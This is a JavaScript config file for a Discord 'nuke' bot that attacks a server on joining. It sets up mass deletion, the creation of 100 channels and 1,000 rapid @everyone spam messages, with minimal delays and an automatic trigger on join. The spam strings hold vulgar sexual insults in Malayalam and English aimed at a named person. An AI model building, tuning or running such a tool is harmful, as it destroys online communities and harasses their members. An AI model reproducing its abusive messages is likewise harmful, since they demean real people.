// config.js - ULTRA FAST SETTINGS WITH MALAYALAM SPAM
require('dotenv').config();

module.exports = {
    // Bot Settings
    token: process.env.DISCORD_TOKEN || '9',
    prefix: '!',
    
    // MASSIVE NUKE SETTINGS
    channelName: 'IMPOSTER-network',
    spamMessage: '@everyone **DICK BY IMPOSTER NETWORK** 💀 @everyone',
    channelsToCreate: 100,        // 100 CHANNELS
    messagesPerChannel: 10,        // 10 MESSAGES EACH = 1000 TOTAL MESSAGES
    
    // IMAGE SPAM SETTINGS
    imageUrl: 'https://cdn.discordapp.com/attachments/1432913057922678864/1506750727790526514/image.png',
    
    // ULTRA FAST DELAYS (MINIMAL to maximize speed)
    delays: {
        delete: 100,       // Super fast deletion (100ms)
        create: 150,        // Fast creation (150ms)
        spam: 50,           // Rapid fire spam (50ms)
        embed: 100          // Fast embed sending
    },
    
    // Auto Nuke Settings
    autoNukeOnJoin: true,  // Instant nuke on join
    
    // Server Settings
    port: process.env.PORT || 3000,
    
    // Bot Status Messages
    statusMessages: [
        '💀 MASS NUKE READY',
        '🔥 1000 MESSAGES INCOMING',
        '⚡ SINGLE CHANNEL MASSACRE',
        '💀 XPORDINTE ANDI NEWTONTE AMMEDE VAYIL'
    ],
    
    // SPAM MESSAGES WITH @EVERYONE - UPDATED MALAYALAM
    spamMessages: [
        '@everyone 🔥 **1000 MESSAGES INCOMING** 🔥 @everyone\n**x9**',
        '@everyone ⚡ **SINGLE CHANNEL MASSACRE** ⚡ @everyone\n**x9**',
        '@everyone 💀 **XPORDINTE ANDI NEWTONTE AMMEDE VAYIL** 💀 @everyone\n**x9**',
        '@everyone 🔥 **ANDI NEWTONTE AMMEDA VAYI** 🔥 @everyone\n**x9**',
        '@everyone 💀 **DICK BY IMPOSTER NETWORK** 💀 @everyone\n**x9**'
    ]
};
